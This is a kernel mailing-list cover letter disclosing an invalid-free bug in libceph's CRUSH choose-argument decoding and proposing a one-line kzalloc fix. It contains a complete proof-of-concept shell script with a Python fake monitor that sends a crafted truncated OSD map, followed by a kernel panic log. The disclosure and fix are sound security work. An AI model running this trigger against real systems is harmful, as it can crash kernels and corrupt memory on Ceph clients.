Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6639141A574
	for <ceph-devel@vger.kernel.org>; Sun, 27 Sep 2026 17:44:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790531070; cv=none; b=H+l6Os8UyMDplhJG5e4+rzT1XlFIOw1HDfyMNIEa+vZsWltpPZ5zV63j291w9OOv86jqxmtbpp34esSmLZ1WnRLzDnGKCsMsdchEODgH6A1FNrtdxA8Gg57p38YxLZcdapC0t76ueO3bBqfeOnWM6eY2Zv0qCP/3fxiPMJ228tM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790531070; c=relaxed/simple;
	bh=4wUxr6IhbewbFVpe19QSZeFK8nzwfH8yvTTRoKHsePE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=CpCg2026UAbGDCwgj1PlySCRWTmrdfx7eaSvkeys1CxEMB7w31ZC5Bpa/4pgFRFdmLi8iNiKIhWLZ3u4z0iNbXhV7grvuVdbKZnoJhKovBom+ErZGvBQhwnTv9OOjFDsEeSWCVAGU8kyyIyaiZ32SJWj5g5xH+hk4j6SYYmczec=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=YPr6IA31; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="YPr6IA31"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396ccd4f99dso1537077a91.2
        for <ceph-devel@vger.kernel.org>; Sun, 27 Sep 2026 10:44:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790531068; x=1791135868; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=pzQlH5RRsuaFQJAIMfx+FM3qBtWPqkwlegUW29SR/Yo=;
        b=YPr6IA31ztzniWHbuFn1iGRjIn4bJ1TquF2rLBWFSAGLegOqSmLl9ojxbJrKmukNDt
         wS5EZQyyToStMNScNykOHYtGROVMvyO/r5arjjKjHloac/NjbL9SXqbcZLr5dX6OM+n1
         9LY3DEyu5sYqe3Y/V7hmi5BLinHs/nmuqA34QTeJ8DDP+tqXp0mN7XJ+IztklEfURG/I
         ZbsH8tcayg2rEe6pe4qx5DMuLmsWmkpdHYhnaOVE/wdVkeaUkZikNTPGShYl62yqnnrY
         /qOCyFydWeTn0nFfyy8sTbxsX6fzE8eCLJ7/egKBFMsD8S9oBNKNnkSrhwgAJjUEvejY
         +Gow==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790531068; x=1791135868;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=pzQlH5RRsuaFQJAIMfx+FM3qBtWPqkwlegUW29SR/Yo=;
        b=CU+G7f3m0BuTVxXSTQHA+6gvbM0FpyIUY//r2FFS7AXLNfs8DErfxQ7Xz3W9nPTg/g
         ig3qv8hQWyYqWz+VnLOsTvBqressE7RKinFFc+Zf8gecwGV9ayIeZ9si3LxHVPiES8Xi
         IYQ/4AuoJn/3x3rGMFcWv3+pKVxbSJ52qq5iYOT5at/WJMAgUGxz85ENuPLQfa8FGtMB
         EO7Q8xRg2RPyoUj6bKdoYSjLhaXP3n/AMFC7EaiyEXKNA7rhhGr/9eSVbiYcnrYhqAgS
         3tdKTHy4kB/DsZGTuHlyIXVOtqHUGcyigx/zoRpHHJ5ElUgDFTOHZHmJZXPgjEyFl2fv
         HNSg==
X-Gm-Message-State: AFq9FYI6wBHe+Kc6ewX5fRlpGjrVq/AG7OqJtwGdWRscbPSkLZuvzQfd
	fO7aLcTeHAYfqJpRYZDxMUjN0neAnkovetYKdxJpc6A/jPL9vWupCWLbZGjRMjBkMk2x8a69DAq
	bna2QVkZkDMw=
X-Gm-Gg: AYBFou1zTQ02AQGEIPQGX7l3Zknjiuy6TXwLyLuG5xyNfnwDDP3xqTpToW5AK5W4q2T
	ltWFGoWAHCOP7OgfNe9C3bUcUw8GbbsNdRK4Uf9J0esxTdDhRHMF7n+0w/2kXSAgdzA8cDIvKlh
	oWayTAChCUhbzumPY5j+jBNViOqgkkYw01E9v+zj684URUKl5/7Wolkwsr+mRJhVNkDFdjtDble
	JUMKoJ9ummJfIegL/LMe0Fe5mVX1zdj4+KVJ+F0jQYSb/ESsE0v89u/zHcGYehhBx/V8tLy7hll
	/Z+zxzL5+pNqyLRVsxmnilf8twU9o6+jbCAdWwcQMZZ0WPmaGXRx2Ndt/MnQejiYgEfEIrwV8Oe
	0qlJzF63mX68/L6oysYwo5xL2Xm3W19jOLLljZ3hDTlG83WHwb1syZ+3G4pkkVNbQIiCPYswYia
	uKjlVZMmZWjwMVWIYtdRFSFVDoaT+fk+UiWLbYi/1x2KkPWJPM9PAsh5+NV+I7i6BW9me2OF/YQ
	asIdaHm
X-Received: by 2002:a17:90b:180d:b0:39e:58fc:1d73 with SMTP id 98e67ed59e1d1-3a098d962eamr10511278a91.23.1790531067542;
        Sun, 27 Sep 2026 10:44:27 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([23.129.140.236])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b9356f48sm16070056a91.6.2026.09.27.10.44.24
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 27 Sep 2026 10:44:26 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: ceph-devel@vger.kernel.org,
	Ilya Dryomov <idryomov@gmail.com>
Cc: amarkuze@redhat.com,
	slava@dubeyko.com,
	vega@nebusec.ai,
	zzyy19904204639@163.com,
	weir@nebusec.ai
Subject: [PATCH net-ceph 0/1] libceph: initialize CRUSH choose argument weights
Date: Mon, 28 Sep 2026 01:44:21 +0800
Message-ID: <cover.1790491709.git.zzyy19904204639@163.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Darong Lu <zzyy19904204639@163.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ceph/osdmap.c. The bug is
triggered when a libceph client decodes a malformed full Ceph OSD map.
We've tested the fix, and it does not change the valid map decoding
path.

This issue is tracked at:
https://bugtracker.nebusec.ai/f/5237

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---- details below ----

Bug details:

`decode_choose_arg()` assumes that its `struct crush_choose_arg` is
zero-initialized. The containing `arg_map->args` array is allocated
with `kzalloc_objs()`, so each `struct crush_choose_arg` starts in that
state. However, the nested `arg->weight_set` array is allocated with
`kmalloc_objs()` and its entries are left uninitialized.

The decoder reads `weight_set_size` and fills the weight-set entries
one at a time. If a malformed or truncated weight vector causes
`decode_array_32_alloc()` to fail, the current entry is reset to NULL
and the error is returned. Entries that have not been visited still
contain uninitialized `weights` pointers.

`decode_choose_args()` then unwinds through `free_choose_arg_map()`.
That cleanup walks the complete declared `weight_set_size` and calls
`kfree()` for every `weights` pointer. It therefore attempts to free
uninitialized slab data from entries that were never decoded. The
result is an invalid free that can corrupt memory or trigger a kernel
fault during the pointer validation in `kfree()`.

The fix changes only the nested array allocation from `kmalloc_objs()`
to `kzalloc_objs()`, keeping the element type, element count and
`GFP_NOIO` allocation context unchanged. All weight-set entries now
start with NULL pointers and zero sizes. Entries decoded successfully
are overwritten with their real allocations, while untouched entries
remain safe for cleanup. `kfree(NULL)` makes every partial-decode
failure safe without changing the successful decode result.

The affected call path is a full `CEPH_MSG_OSD_MAP` received from a
monitor:

`mon_dispatch()` -> `ceph_osdc_handle_map()` -> `handle_one_map()` ->
`ceph_osdmap_decode()` -> `osdmap_decode()` -> `crush_decode()` ->
`decode_choose_args()` -> `decode_choose_arg()`.

The supplied reproducer uses a fake local monitor to send a truncated
CRUSH choose-argument section. The map declares 64 weight-set entries
and truncates the first vector payload, which exercises cleanup of the
untouched entries.

Reachability and privilege:

The supplied reproducer reaches this path by mounting CephFS as root in
the initial user namespace. The Ceph filesystem type does not enable
`FS_USERNS_MOUNT`, so an unprivileged user or an unprivileged user
namespace cannot create the required CephFS mount in this setup.

Reproducer:

Run the supplied `poc.sh` as root in a disposable 2 vCPU, 2 GB x86
QEMU guest. The guest needs Python 3 and the kernel command line must
include `init_on_alloc=0` so stale slab contents can expose the original
bad state.

------BEGIN poc.sh------

#!/bin/sh
set -eu

PORT="${PORT:-6789}"
MNT="${MNT:-/run/ceph-poc}"
LOG="${LOG:-/run/ceph-osdmap-poc.log}"

if ! grep -qw 'init_on_alloc=0' /proc/cmdline; then
    echo "init_on_alloc=0 is required; current /proc/cmdline does not disable slab init-on-alloc" >&2
    exit 1
fi

if [ -w /proc/sys/kernel/panic_on_warn ]; then
    echo 0 > /proc/sys/kernel/panic_on_warn
fi

cat > /run/ceph-osdmap-poc.py <<'PY'
import os
import shutil
import socket
import struct
import sys
import time

PORT = int(os.environ.get("PORT", "6789"))

CRC32C_POLY = 0x82F63B78
CRC32C_TABLE = []
for i in range(256):
    crc = i
    for _ in range(8):
        if crc & 1:
            crc = (crc >> 1) ^ CRC32C_POLY
        else:
            crc >>= 1
    CRC32C_TABLE.append(crc & 0xFFFFFFFF)


def crc32c(data, crc=0):
    for b in data:
        crc = CRC32C_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF


def p8(v):
    return struct.pack("<B", v)


def p16(v):
    return struct.pack("<H", v)


def p32(v):
    return struct.pack("<I", v)


def p64(v):
    return struct.pack("<Q", v)


def banner_addr(ip, port, nonce=0):
    ss = bytearray(128)
    ss[0:2] = struct.pack("!H", socket.AF_INET)
    ss[2:4] = struct.pack("!H", port)
    ss[4:8] = socket.inet_aton(ip)
    return struct.pack("<II", 0, nonce) + bytes(ss)


def build_crush_blob():
    blob = bytearray()
    blob += p32(0x00010000)  # CRUSH_MAGIC
    blob += p32(1)           # max_buckets
    blob += p32(0)           # max_rules
    blob += p32(0)           # max_devices
    blob += p32(0)           # bucket[0] absent
    blob += p32(0)           # type_names
    blob += p32(0)           # names
    blob += p32(0)           # rule_name_map
    blob += p32(2)           # choose_local_tries
    blob += p32(5)           # choose_local_fallback_tries
    blob += p32(19)          # choose_total_tries
    blob += p32(0)           # chooseleaf_descend_once
    blob += p8(0)            # chooseleaf_vary_r
    blob += p8(0)            # straw_calc_version
    blob += p32(0)           # allowed_bucket_algs
    blob += p8(0)            # chooseleaf_stable
    blob += p32(0)           # class_map
    blob += p32(0)           # class_name
    blob += p32(0)           # class_bucket
    blob += p32(1)           # num_choose_arg_maps
    blob += p64(0)           # choose_args_index
    blob += p32(1)           # num_buckets
    blob += p32(0)           # bucket_index
    blob += p32(64)          # weight_set_size
    blob += p32(1)           # first vector length
    # Intentionally omit the first vector payload and all remaining entries.
    return bytes(blob)


def build_full_osdmap():
    crush = build_crush_blob()
    full = bytearray()
    full += p8(7)            # wrapper v
    full += p8(7)            # wrapper compat
    full += p32(0)           # wrapper len (ignored)
    full += p8(2)            # client_data v
    full += p8(1)            # client_data compat
    full += p32(0)           # client_data len (ignored)
    full += b"\x00" * 16     # fsid
    full += p32(1)           # epoch
    full += p32(0) + p32(0)  # created
    full += p32(0) + p32(0)  # modified
    full += p32(0)           # pools
    full += p32(0)           # pool names
    full += p32(0)           # pool_max
    full += p32(0)           # flags
    full += p32(0)           # max_osd
    full += p32(0)           # osd_state len
    full += p32(0)           # osd_weight len
    full += p32(0)           # osd_addrs len
    full += p32(0)           # pg_temp
    full += p32(0)           # primary_temp
    full += p32(0)           # primary_affinity
    full += p32(len(crush))  # crush len
    full += crush
    return bytes(full)


def build_osdmap_front():
    full = build_full_osdmap()
    front = bytearray()
    front += b"\x00" * 16    # fsid
    front += p32(0)          # nr incremental maps
    front += p32(1)          # nr full maps
    front += p32(1)          # epoch
    front += p32(len(full))
    front += full
    return bytes(front)


def build_message(msg_type, front, seq=1, version=1, src_type=1, src_num=0):
    front_crc = crc32c(front)
    header = struct.pack(
        "<QQHHHIIIHBQHHI",
        seq,
        0,
        msg_type,
        127,
        version,
        len(front),
        0,
        0,
        0,
        src_type,
        src_num,
        0,
        0,
        0,
    )
    header_crc = crc32c(header[:-4])
    header = header[:-4] + p32(header_crc)
    footer = struct.pack("<IIIQB", front_crc, 0, 0, 0, 1)
    return b"\x07" + header + front + footer


def recv_exact(conn, size):
    data = bytearray()
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            raise ConnectionError(f"short read {len(data)}/{size}")
        data += chunk
    return bytes(data)


def main():
    if shutil.which("mount") is None:
        raise SystemExit("mount not found")

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", PORT))
    srv.listen(1)
    print(f"listening on {PORT}", flush=True)

    conn, addr = srv.accept()
    print(f"accepted {addr}", flush=True)

    hello = recv_exact(conn, 9 + 136)
    print(f"client hello {len(hello)} bytes", flush=True)

    reply = (
        b"ceph v027" +
        banner_addr("127.0.0.1", PORT, 0) +
        banner_addr(addr[0], addr[1], 0)
    )
    conn.sendall(reply)
    print(f"sent banner {len(reply)} bytes", flush=True)

    connect = recv_exact(conn, 33)
    features, host_type, global_seq, connect_seq, proto, auth_proto, auth_len, flags = struct.unpack(
        "<QIIIIIIB", connect
    )
    print(
        "connect "
        f"features=0x{features:x} host_type={host_type} "
        f"global_seq={global_seq} connect_seq={connect_seq} "
        f"proto={proto} auth_proto={auth_proto} auth_len={auth_len} flags={flags}",
        flush=True,
    )

    reply = struct.pack(
        "<BQIIIIB",
        1,              # CEPH_MSGR_TAG_READY
        features,
        global_seq,
        connect_seq + 1,
        proto,
        0,
        0,
    )
    conn.sendall(reply)
    print(f"sent connect reply {len(reply)} bytes", flush=True)

    msg = build_message(41, build_osdmap_front())
    conn.sendall(msg)
    print(f"sent osdmap message {len(msg)} bytes", flush=True)

    time.sleep(5)
    conn.close()
    srv.close()


if __name__ == "__main__":
    main()
PY

chmod 700 /run/ceph-osdmap-poc.py
mkdir -p "$MNT"

python3 /run/ceph-osdmap-poc.py >"$LOG" 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null || true' EXIT INT TERM

sleep 1
mount -i -t ceph "127.0.0.1:${PORT}:/" "$MNT" -o name=admin,ms_mode=legacy,mount_timeout=5 || true
wait "$server_pid" || true
cat "$LOG"


------END poc.sh--------

----BEGIN crash log----

[  217.135595][   T59] kernel BUG at arch/x86/mm/physaddr.c:28!
[  217.136933][   T59] Oops: invalid opcode: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  217.138041][   T59] CPU: 2 UID: 0 PID: 59 Comm: kworker/2:1 Not tainted 6.12.95 #2
[  217.139096][   T59] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  217.140784][   T59] Workqueue: ceph-msgr ceph_con_workfn
[  217.141744][   T59] RIP: 0010:__phys_addr+0x7a/0xd0
[  217.142558][   T59] Code: 84 c9 75 28 0f b6 0d a6 09 16 0f 80 f9 3f 0f 87 24 bd 0b 09 48 89 c2 48 d3 ea 48 85 d2 75 0a 48 83 c4 08 5b e9 12 ce 37 09 90 <0f> 0b 48 c7 c7 81 7c 4e 90 48 89 04 24 e8 b4 25 a5 00 48 8b 04 24
[  217.145254][   T59] RSP: 0018:ffffc900004073a8 EFLAGS: 00010287
[  217.146147][   T59] RAX: 6b6be2eb6b6b6b6b RBX: 6b6b6b6beb6b6b6b RCX: 0000000000000001
[  217.147258][   T59] RDX: 0000000000000000 RSI: ffffffff8aee78e0 RDI: 6b6b6b6b6b6b6b6b
[  217.148380][   T59] RBP: ffffc90000407420 R08: 0000000000000001 R09: fffffbfff2c699b0
[  217.149702][   T59] R10: ffffffff9634cd87 R11: 0000000000000003 R12: 000000000003decc
[  217.150918][   T59] R13: 0000000000000002 R14: 0000000000000000 R15: ffff88810c649260
[  217.152046][   T59] FS:  0000000000000000(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  217.153293][   T59] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  217.154210][   T59] CR2: 0000000000722a00 CR3: 0000000061ab2000 CR4: 0000000000750ef0
[  217.155337][   T59] PKRU: 55555554
[  217.155848][   T59] Call Trace:
[  217.156316][   T59]  <TASK>
[  217.156742][   T59]  kfree+0x6f/0x4a0
[  217.157483][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.158393][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.159263][   T59]  free_choose_arg_map+0x1e7/0x360
[  217.160542][   T59]  crush_decode+0x3a4d/0x4250
[  217.161272][   T59]  ? __pfx_crush_decode+0x10/0x10
[  217.162015][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.162912][   T59]  osdmap_decode+0xeea/0x1980
[  217.163604][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.164409][   T59]  ? __pfx_osdmap_decode+0x10/0x10
[  217.165137][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.165929][   T59]  ? __init_waitqueue_head+0xcf/0x150
[  217.166865][   T59]  ceph_osdmap_decode+0x3d/0x70
[  217.167606][   T59]  handle_one_map+0x58b/0x7b0
[  217.168298][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.169110][   T59]  ? __pfx_handle_one_map+0x10/0x10
[  217.169846][   T59]  ? __pfx_down_write+0x10/0x10
[  217.170581][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.171422][   T59]  ceph_osdc_handle_map+0x9a6/0x1690
[  217.172216][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.173020][   T59]  ? __pfx_ceph_osdc_handle_map+0x10/0x10
[  217.173823][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.174604][   T59]  ? find_held_lock+0x2d/0x110
[  217.175338][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.176162][   T59]  ? __pfx_inet_recvmsg+0x10/0x10
[  217.177006][   T59]  mon_dispatch+0x724/0x21c0
[  217.177648][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.178441][   T59]  ? __mutex_unlock_slowpath+0x166/0x680
[  217.179280][   T59]  ? __pfx_mon_dispatch+0x10/0x10
[  217.180012][   T59]  ? __pfx_ceph_tcp_recvmsg+0x10/0x10
[  217.180843][   T59]  ceph_con_process_message+0x1f8/0x640
[  217.181624][   T59]  ceph_con_v1_try_read+0x2a95/0x6200
[  217.182402][   T59]  ? ceph_con_workfn+0x48/0xf20
[  217.183103][   T59]  ? __pfx___mutex_lock+0x10/0x10
[  217.183839][   T59]  ? __pfx_ceph_con_v1_try_read+0x10/0x10
[  217.184656][   T59]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  217.185337][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.185989][   T59]  ? rcu_is_watching+0x12/0xc0
[  217.186570][   T59]  ceph_con_workfn+0x791/0xf20
[  217.187127][   T59]  process_one_work+0x855/0x1ac0
[  217.187720][   T59]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  217.188338][   T59]  ? __pfx_process_one_work+0x10/0x10
[  217.188953][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.189558][   T59]  worker_thread+0x4f4/0xd60
[  217.190079][   T59]  ? lockdep_hardirqs_on+0x7b/0x110
[  217.190661][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.191291][   T59]  ? srso_alias_return_thunk+0x5/0xfbef5
[  217.191922][   T59]  ? __kthread_parkme+0xb0/0x1d0
[  217.192477][   T59]  ? __pfx_worker_thread+0x10/0x10
[  217.193051][   T59]  ? __pfx_worker_thread+0x10/0x10
[  217.193612][   T59]  kthread+0x27e/0x350
[  217.194066][   T59]  ? _raw_spin_unlock_irq+0x28/0x50
[  217.194648][   T59]  ? __pfx_kthread+0x10/0x10
[  217.195184][   T59]  ret_from_fork+0x31/0x70
[  217.195711][   T59]  ? __pfx_kthread+0x10/0x10
[  217.196227][   T59]  ret_from_fork_asm+0x1a/0x30
[  217.196820][   T59]  </TASK>
[  217.197173][   T59] Modules linked in:
[  217.198261][   T59] ---[ end trace 0000000000000000 ]---
[  217.198958][   T59] RIP: 0010:__phys_addr+0x7a/0xd0
[  217.199527][   T59] Code: 84 c9 75 28 0f b6 0d a6 09 16 0f 80 f9 3f 0f 87 24 bd 0b 09 48 89 c2 48 d3 ea 48 85 d2 75 0a 48 83 c4 08 5b e9 12 ce 37 09 90 <0f> 0b 48 c7 c7 81 7c 4e 90 48 89 04 24 e8 b4 25 a5 00 48 8b 04 24
[  217.201648][   T59] RSP: 0018:ffffc900004073a8 EFLAGS: 00010287
[  217.202332][   T59] RAX: 6b6be2eb6b6b6b6b RBX: 6b6b6b6beb6b6b6b RCX: 0000000000000001
[  217.203213][   T59] RDX: 0000000000000000 RSI: ffffffff8aee78e0 RDI: 6b6b6b6b6b6b6b6b
[  217.204081][   T59] RBP: ffffc90000407420 R08: 0000000000000001 R09: fffffbfff2c699b0
[  217.204979][   T59] R10: ffffffff9634cd87 R11: 0000000000000003 R12: 000000000003decc
[  217.205536][   T59] R13: 0000000000000002 R14: 0000000000000000 R15: ffff88810c649260
[  217.206073][   T59] FS:  0000000000000000(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  217.206681][   T59] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  217.207197][   T59] CR2: 0000000000722a00 CR3: 0000000061ab2000 CR4: 0000000000750ef0
[  217.207723][   T59] PKRU: 55555554
[  217.207981][   T59] Kernel panic - not syncing: Fatal exception
[  217.208693][   T59] Kernel Offset: disabled
[  217.208991][   T59] Rebooting in 86400 seconds..


-----END crash log-----

Validation:

- `make O=build -j2 bzImage` completed successfully with KASAN enabled.
- Truncated first-vector, truncated later-vector and truncated ids
  inputs were all rejected with `-EINVAL` without a kernel fault.
- A complete map was accepted by the decoder and the client continued
  to wait for an MDS, which is absent from the disposable test cluster.
- The QEMU guest remained reachable after all four cases.

Best regards,
Darong Lu

Darong Lu (1):
  libceph: initialize CRUSH choose argument weights

 net/ceph/osdmap.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.53.0

